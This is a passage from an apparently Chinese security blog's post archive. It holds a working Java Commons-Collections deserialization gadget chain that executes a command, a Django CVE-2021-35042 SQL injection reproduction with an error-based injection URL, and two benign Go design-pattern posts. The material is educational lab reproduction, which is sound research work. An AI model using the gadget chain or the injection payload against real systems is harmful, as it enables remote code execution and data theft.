args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException, IOException </span>&#123;</span><br><span class="line">        Transformer[] transformers_exec = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer chain = <span class="keyword">new</span> ChainedTransformer(transformers_exec);</span><br><span class="line"></span><br><span class="line">        HashMap innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;ddddddd&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap,chain);</span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建LazyMap的handler实例</span></span><br><span class="line">        InvocationHandler handler = (InvocationHandler) cons.newInstance(Override.class,lazyMap);</span><br><span class="line">        <span class="comment">// 创建LazyMap的动态代理实例</span></span><br><span class="line">        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(), handler);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个AnnotationInvocationHandler实例，并且把刚刚创建的代理赋值给this.memberValues</span></span><br><span class="line">        InvocationHandler handler1 = (InvocationHandler)cons.newInstance(Override.class, mapProxy);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(handler1);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 本地模拟反序列化</span></span><br><span class="line">        ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">        Object obj = (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>







<h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5. 总结"></a>5. 总结</h2><p>对poc进行了简单分析，分别使用了TransformedMap版和lazyMpa进行了复现</p>
<h2 id="6-参考"><a href="#6-参考" class="headerlink" title="6. 参考"></a>6. 参考</h2><ul>
<li> <a href="https://shadowflow123.github.io/2021/12/15/Commons-Collections-1">https://shadowflow123.github.io/2021/12/15/Commons-Collections-1</a></li>
</ul>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>Django-SQL注入漏洞分析CVE-2021-35042</title>
    <url>/Django-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90CVE-2021-35042/</url>
    <content><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Django 组件存在 SQL 注入漏洞，该漏洞是由于对 QuerySet.order_by()中用户提供数据的过滤不足，攻击者可利用该漏洞在未授权的情况下，构造恶意数据执行 SQL 注入攻击，最终造成服务器敏感信息泄露。</p>
<span id="more"></span>

<h3 id="组件介绍"><a href="#组件介绍" class="headerlink" title="组件介绍"></a>组件介绍</h3><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p><strong>影响版本</strong></p>
<p>Django 3.2<br>Django 3.1</p>
<p><strong>条件：</strong></p>
<ul>
<li><code>Debug=True</code></li>
<li>接口使用<code>order_by</code>方法</li>
<li>正确的列名</li>
</ul>
<p><strong>安全版本</strong></p>
<p>Django &gt;= 3.2.5<br>Django &gt;= 3.1.13</p>
<h3 id="安装Django"><a href="#安装Django" class="headerlink" title="安装Django"></a>安装Django</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python3</span> -m pip install django==<span class="number">3</span>.<span class="number">2</span>.<span class="number">4</span></span><br></pre></td></tr></table></figure>

<p>验证一下是否安装成功：</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">[root<span class="symbol">@vuln</span> /tmp]<span class="meta"># python3 -m django --version</span></span><br><span class="line"><span class="number">3.2</span><span class="number">.4</span></span><br></pre></td></tr></table></figure>





<h3 id="默认启动尝试"><a href="#默认启动尝试" class="headerlink" title="默认启动尝试"></a>默认启动尝试</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">django-admin startproject demo</span><br><span class="line"></span><br><span class="line"><span class="keyword">python3</span> manage.<span class="keyword">py</span> runserver</span><br></pre></td></tr></table></figure>

<p>这时候可以通过127.0.01:8000访问。</p>
<p>以0.0.0.0启动，<strong>如果想远程访问开启demo/settings的<code>ALLOWED_HOSTS = [&#39;*&#39;]</code></strong></p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python3</span> manage.py runserver <span class="number">0.0.0.0:8000</span></span><br></pre></td></tr></table></figure>





<h3 id="创建第一个应用"><a href="#创建第一个应用" class="headerlink" title="创建第一个应用"></a>创建第一个应用</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">python3</span> manage.<span class="keyword">py</span> startapp app</span><br></pre></td></tr></table></figure>



<ul>
<li><p>app/view.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>(<span class="params">request</span>):</span></span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">&quot;Hello, world. You&#x27;re at the app index.&quot;</span>)</span><br></pre></td></tr></table></figure></li>
<li><p>创建app/urls.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">&#x27;&#x27;</span>, views.index, name=<span class="string">&#x27;index&#x27;</span>),</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li>
<li><p>demo/urls.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> include, path</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">&#x27;admin/&#x27;</span>, admin.site.urls),</span><br><span class="line">    path(<span class="string">&#x27;app/&#x27;</span>, include(<span class="string">&#x27;app.urls&#x27;</span>)),</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li>
</ul>
<p>启动</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python3</span> manage.py runserver <span class="number">0.0.0.0:8000</span></span><br></pre></td></tr></table></figure>

<p>访问</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">172.16</span>.<span class="number">42.151</span>:<span class="number">8000</span><span class="regexp">/app/</span></span><br></pre></td></tr></table></figure>

<p>返回</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">Hello, world. You<span class="symbol">&#x27;re</span> <span class="keyword">at</span> the app index.</span><br></pre></td></tr></table></figure>



<h3 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h3><p><strong>安装mysql驱动</strong></p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">apt <span class="keyword">install </span>python3-dev default-libmysqlclient-dev <span class="keyword">build-essential</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line">python3 -m pip <span class="keyword">install </span>mysqlclient</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#mac</span></span><br><span class="line"><span class="comment"># Assume you are activating Python 3 venv</span></span><br><span class="line">$ <span class="keyword">brew </span><span class="keyword">install </span>mysql</span><br><span class="line">$ pip <span class="keyword">install </span>mysqlclient</span><br></pre></td></tr></table></figure>



<p><strong>启动mysql数据库</strong></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">docker <span class="builtin-name">run</span> -itd --name my-mysql -p 3306:3306 -e <span class="attribute">MYSQL_ROOT_PASSWORD</span>=123456 -e <span class="attribute">MYSQL_DATABASE</span>=demo mysql:8.0.15</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docker exec -it my-mysql bash</span><br><span class="line"></span><br><span class="line">mysql -u root -p</span><br><span class="line"></span><br><span class="line">开启远程访问</span><br><span class="line">use mysql;</span><br><span class="line">ALTER<span class="built_in"> USER </span><span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED WITH mysql_native_password BY <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure>

<p>继续使用上一步创建的项目</p>
<ul>
<li><p>app/models.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create your models here.</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Collection</span>(<span class="params">models.Model</span>):</span></span><br><span class="line">    name = models.CharField(max_length=<span class="number">128</span>)</span><br></pre></td></tr></table></figure></li>
<li><p>app/views.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> Collection</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vul</span>(<span class="params">request</span>):</span></span><br><span class="line">    query = request.GET.get(<span class="string">&#x27;order&#x27;</span>, default=<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">    q = Collection.objects.order_by(query)</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(q.values())</span><br></pre></td></tr></table></figure></li>
<li><p>生成数据库</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">python3</span> manage.<span class="keyword">py</span> makemigrations &amp;&amp; <span class="keyword">python3</span> manage.<span class="keyword">py</span> migrate</span><br></pre></td></tr></table></figure></li>
<li><p>给数据库添加数据</p>
</li>
</ul>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>访问</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">172.16</span>.<span class="number">42.151</span>:<span class="number">8000</span><span class="regexp">/app/</span>vuln/?order=id</span><br></pre></td></tr></table></figure>

<p>返回结果</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;id&#x27;: <span class="number">1</span>, &#x27;name&#x27;: &#x27;a&#x27;&#125;&#123;&#x27;id&#x27;: <span class="number">2</span>, &#x27;name&#x27;: &#x27;b&#x27;&#125;</span><br></pre></td></tr></table></figure>

<p>访问</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">172.16</span>.<span class="number">42.151</span>:<span class="number">8000</span><span class="regexp">/app/</span>vuln/?order=-id</span><br></pre></td></tr></table></figure>

<p>返回逆序</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;id&#x27;: <span class="number">2</span>, &#x27;name&#x27;: &#x27;b&#x27;&#125;&#123;&#x27;id&#x27;: <span class="number">1</span>, &#x27;name&#x27;: &#x27;a&#x27;&#125;</span><br></pre></td></tr></table></figure>

<p>注入(<strong>这是通过django的debug功能报错注入</strong>)</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">172.16</span>.<span class="number">42.151</span>:<span class="number">8000</span><span class="regexp">/app/</span>vuln/?order=-id</span><br></pre></td></tr></table></figure>



<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">172.16.42.151:8000</span>/app/vuln/?order=.id);select%<span class="number">20</span>updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x<span class="number">7</span>e,(select%<span class="number">20</span>@@version)),<span class="number">1</span>)%<span class="number">23</span></span><br></pre></td></tr></table></figure>



<p><img src="../images/pics/%E6%89%93%E9%9D%B6/39.jpg"></p>
<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>漏洞出现在add_ordering函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_ordering</span>(<span class="params">self, *ordering</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Add items from the &#x27;ordering&#x27; sequence to the query&#x27;s &quot;order by&quot;</span></span><br><span class="line"><span class="string">    clause. These items are either field names (not column names) --</span></span><br><span class="line"><span class="string">    possibly with a direction prefix (&#x27;-&#x27; or &#x27;?&#x27;) -- or OrderBy</span></span><br><span class="line"><span class="string">    expressions.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    If &#x27;ordering&#x27; is empty, clear all ordering from the query.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    errors = []</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> ordering:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(item, <span class="built_in">str</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> item:</span><br><span class="line">                warnings.warn(</span><br><span class="line">                    <span class="string">&#x27;Passing column raw column aliases to order_by() is &#x27;</span></span><br><span class="line">                    <span class="string">&#x27;deprecated. Wrap %r in a RawSQL expression before &#x27;</span></span><br><span class="line">                    <span class="string">&#x27;passing it to order_by().&#x27;</span> % item,</span><br><span class="line">                    category=RemovedInDjango40Warning,</span><br><span class="line">                    stacklevel=<span class="number">3</span>,</span><br><span class="line">                )</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> item == <span class="string">&#x27;?&#x27;</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> item.startswith(<span class="string">&#x27;-&#x27;</span>):</span><br><span class="line">                item = item[<span class="number">1</span>:]</span><br><span class="line">            <span class="keyword">if</span> item <span class="keyword">in</span> self.annotations:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> self.extra <span class="keyword">and</span> item <span class="keyword">in</span> self.extra:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment"># names_to_path() validates the lookup. A descriptive</span></span><br><span class="line">            <span class="comment"># FieldError will be raise if it&#x27;s not.</span></span><br><span class="line">            self.names_to_path(item.split(LOOKUP_SEP), self.model._meta)</span><br><span class="line">        <span class="keyword">elif</span> <span class="keyword">not</span> <span class="built_in">hasattr</span>(item, <span class="string">&#x27;resolve_expression&#x27;</span>):</span><br><span class="line">            errors.append(item)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">getattr</span>(item, <span class="string">&#x27;contains_aggregate&#x27;</span>, <span class="literal">False</span>):</span><br><span class="line">            <span class="keyword">raise</span> FieldError(</span><br><span class="line">                <span class="string">&#x27;Using an aggregate in order_by() without also including &#x27;</span></span><br><span class="line">                <span class="string">&#x27;it in annotate() is not allowed: %s&#x27;</span> % item</span><br><span class="line">            )</span><br><span class="line">    <span class="keyword">if</span> errors:</span><br><span class="line">        <span class="keyword">raise</span> FieldError(<span class="string">&#x27;Invalid order_by arguments: %s&#x27;</span> % errors)</span><br><span class="line">    <span class="keyword">if</span> ordering:</span><br><span class="line">        self.order_by += ordering</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        self.default_ordering = <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p>如果我们的payload包含<code>.</code>，那么就会continue到如下语句</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">if <span class="keyword">ordering:</span></span><br><span class="line"><span class="keyword"></span>    self.<span class="keyword">order_by </span>+= <span class="keyword">ordering</span></span><br></pre></td></tr></table></figure>

<p>直接进行了sql语句的拼接。</p>
<p>正常会到names_to_path()函数，该函数会匹配传入的参数是不是model模型里的字段名。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://www.freebuf.com/vuls/283262.html">https://www.freebuf.com/vuls/283262.html</a></li>
<li><a href="https://docs.djangoproject.com/">https://docs.djangoproject.com/</a></li>
<li><a href="https://docs.djangoproject.com/zh-hans/4.1/ref/databases/#mysql-notes">https://docs.djangoproject.com/zh-hans/4.1/ref/databases/#mysql-notes</a></li>
<li><a href="https://pypi.org/project/mysqlclient/">https://pypi.org/project/mysqlclient/</a></li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Go语言中用单例模式实现自己的日志库</title>
    <url>/Go%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%94%A8%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%B7%B1%E7%9A%84%E6%97%A5%E5%BF%97%E5%BA%93/</url>
    <content><![CDATA[<p>Go语言自带的日志库不能调整日志输出级别，其他日志库需要通过实例的地址传递实现配置的一致性。对于一个日志组件来说，我们最好全局维护同一个实例。这样刚好满足单例模式。单例模式是常用的模式之一，在它的核心结构中只包含一个被称为单例的特殊类，能够保证系统运行中一个类只创建一个实例。我们就用单例模式来封装一个日志库。</p>
<span id="more"></span>

<p>代码地址：<a href="https://github.com/ShadowFl0w/logger">https://github.com/ShadowFl0w/logger</a></p>
<h2 id="代码解释"><a href="#代码解释" class="headerlink" title="代码解释"></a>代码解释</h2><p>定义日志级别</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> (</span><br><span class="line">	LFATAL = <span class="number">1</span> &lt;&lt; <span class="literal">iota</span></span><br><span class="line">	LSilent</span><br><span class="line">	LPrintln</span><br><span class="line">	LERROR</span><br><span class="line">	LINFO</span><br><span class="line">	LWARNING</span><br><span class="line">	LDEBUG</span><br><span class="line">	LVerbose</span><br><span class="line">)</span><br></pre></td></tr></table></figure>



<p>初始化方法</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewLogger</span><span class="params">(level <span class="keyword">int32</span>)</span> *<span class="title">Logger</span></span> &#123;</span><br><span class="line">	w := os.Stderr</span><br><span class="line">	<span class="keyword">return</span> &amp;Logger&#123;</span><br><span class="line">		w:             w,</span><br><span class="line">		level:         level,</span><br><span class="line">		fatalLogger:   log.New(w, <span class="string">&quot;[FATAL]&quot;</span>, log.Ldate|log.Ltime|log.Llongfile),</span><br><span class="line">		silentLogger:  log.New(w, <span class="string">&quot;&quot;</span>, <span class="number">0</span>),</span><br><span class="line">		printlnLogger: log.New(w, <span class="string">&quot;&quot;</span>, <span class="number">0</span>),</span><br><span class="line">		errorLogger:   log.New(w, <span class="string">&quot;[ERROR]&quot;</span>, log.Ldate|log.Ltime|log.Llongfile),</span><br><span class="line">		infoLogger:    log.New(w, <span class="string">&quot;[INFO]&quot;</span>, log.Ldate|log.Ltime|log.Lshortfile),</span><br><span class="line">		warningLogger: log.New(w, <span class="string">&quot;[WARNING]&quot;</span>, log.Ldate|log.Ltime|log.Llongfile),</span><br><span class="line">		debugLogger:   log.New(w, <span class="string">&quot;[DEBUG]&quot;</span>, log.Ldate|log.Ltime|log.Llongfile),</span><br><span class="line">		verboseLogger: log.New(w, <span class="string">&quot;[VERBOSE]&quot;</span>, log.Ldate|log.Ltime|log.Llongfile),</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> stdLogger = NewLogger(LVerbose)</span><br></pre></td></tr></table></figure>



<p>定义一个私有变量，将实例给这个私有变量，实现单例。</p>
<p>通过SetLevel方法修改日志级别</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(logger *Logger)</span> <span class="title">SetLevel</span><span class="params">(level <span class="keyword">int32</span>)</span></span> &#123;</span><br><span class="line">	logger.mu.Lock()</span><br><span class="line">	<span class="keyword">defer</span> logger.mu.Unlock()</span><br><span class="line">	logger.level = level</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">SetLevel</span><span class="params">(level <span class="keyword">int32</span>)</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> level &lt; LFATAL || level &gt; LVerbose &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	stdLogger.SetLevel(level)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们可以看到两个SetLevel方法，当我们外部调用SetLevel方法时，实际调用的是<code>stdLogger.SetLevel(level)</code>，stdLogger是我们的单例，通过<code>SetLevel</code>方法修改单例里的level属性。</p>
<p>当我们调用方法的时候就会根据单例里面的级别，输出对应的日志。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(logger *Logger)</span> <span class="title">SetLevel</span><span class="params">(level <span class="keyword">int32</span>)</span></span> &#123;</span><br><span class="line">	logger.mu.Lock()</span><br><span class="line">	<span class="keyword">defer</span> logger.mu.Unlock()</span><br><span class="line">	logger.level = level</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">SetLevel</span><span class="params">(level <span class="keyword">int32</span>)</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> level &lt; LFATAL || level &gt; LVerbose &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	stdLogger.SetLevel(level)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Info</span><span class="params">(arg ...<span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> atomic.LoadInt32(&amp;stdLogger.level) &lt; LINFO &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	stdLogger.infoLogger.Output(<span class="number">2</span>, fmt.Sprintln(arg...))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Error</span><span class="params">(err error)</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> atomic.LoadInt32(&amp;stdLogger.level) &lt; LERROR &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	stdLogger.errorLogger.Output(<span class="number">2</span>, fmt.Sprintln(err))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Println</span><span class="params">(arg ...<span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> atomic.LoadInt32(&amp;stdLogger.level) &lt; LPrintln &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	stdLogger.printlnLogger.Output(<span class="number">2</span>, fmt.Sprintln(arg...))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Silent</span><span class="params">(arg ...<span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> atomic.LoadInt32(&amp;stdLogger.level) &lt; LSilent &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	stdLogger.silentLogger.Output(<span class="number">2</span>, fmt.Sprintln(arg...))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="输出不同格式的日志"><a href="#输出不同格式的日志" class="headerlink" title="输出不同格式的日志"></a>输出不同格式的日志</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> test</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;testing&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/ShadowFl0w/logger&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestLogger</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line">	logger.Info(<span class="string">&quot;Info here!&quot;</span>)</span><br><span class="line">	logger.Println(<span class="string">&quot;Println here!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>输出</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">[<span class="builtin-name">INFO</span>]2022/12/06 14:46:46 logger_test.go:10: <span class="builtin-name">Info</span> here!</span><br><span class="line">Println here!</span><br></pre></td></tr></table></figure>

<p>可以看见，<code>logger.Info</code>输出了日期、输出位置。<code>logger.Println</code>则直接输出结果</p>
<h3 id="调整日志输出级别"><a href="#调整日志输出级别" class="headerlink" title="调整日志输出级别"></a>调整日志输出级别</h3><p>添加<code>    logger.SetLevel(logger.LPrintln)</code></p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">package test</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	<span class="string">&quot;testing&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/ShadowFl0w/logger&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func <span class="constructor">TestLogger(<span class="params">t</span> <span class="operator">*</span><span class="params">testing</span>.T)</span> &#123;</span><br><span class="line">	logger.<span class="constructor">Info(<span class="string">&quot;Info here!&quot;</span>)</span></span><br><span class="line">	logger.<span class="constructor">Println(<span class="string">&quot;Println here!&quot;</span>)</span></span><br><span class="line"></span><br><span class="line">	logger.<span class="constructor">SetLevel(<span class="params">logger</span>.LPrintln)</span></span><br><span class="line"></span><br><span class="line">	logger.<span class="constructor">Info(<span class="string">&quot;Info Level here!&quot;</span>)</span></span><br><span class="line">	logger.<span class="constructor">Println(<span class="string">&quot;Println Level here!&quot;</span>)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们查看结果</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">[shadowflow@ShadowOS test]$ go test</span><br><span class="line">[INFO]<span class="number">2022</span><span class="regexp">/12/</span><span class="number">06</span> <span class="number">15</span>:<span class="number">01</span>:<span class="number">30</span> logger_test.go:<span class="number">10</span>: Info here!</span><br><span class="line"><span class="keyword">Println</span> here!</span><br><span class="line"><span class="keyword">Println</span> Level here!</span><br></pre></td></tr></table></figure>

<p>发现<code>logger.Info(&quot;Info Level here!&quot;)</code> 没有输出。成功调整了日志级别为<code>LPrintln</code></p>
]]></content>
      <categories>
        <category>Code</category>
      </categories>
      <tags>
        <tag>Go</tag>
      </tags>
  </entry>
  <entry>
    <title>Go语言中用工厂模式自动注册实现扫描器插件化</title>
    <url>/Go%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%94%A8%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%86%8C%E5%AE%9E%E7%8E%B0%E6%89%AB%E6%8F%8F%E5%99%A8%E6%8F%92%E4%BB%B6%E5%8C%96/</url>
    <content><![CDATA[<p>Go要实现插件化有几种方法，官方方法是编译成so文件，这太麻烦了；还有的是用一个Go解释器，这对于我们太重了；还有的方法是嵌入<code>go run</code>语句，这太不优雅了。最终我们选择用工厂模式动态创建对象，用map容器来保存对象，实现插件化。</p>
<span id="more"></span>

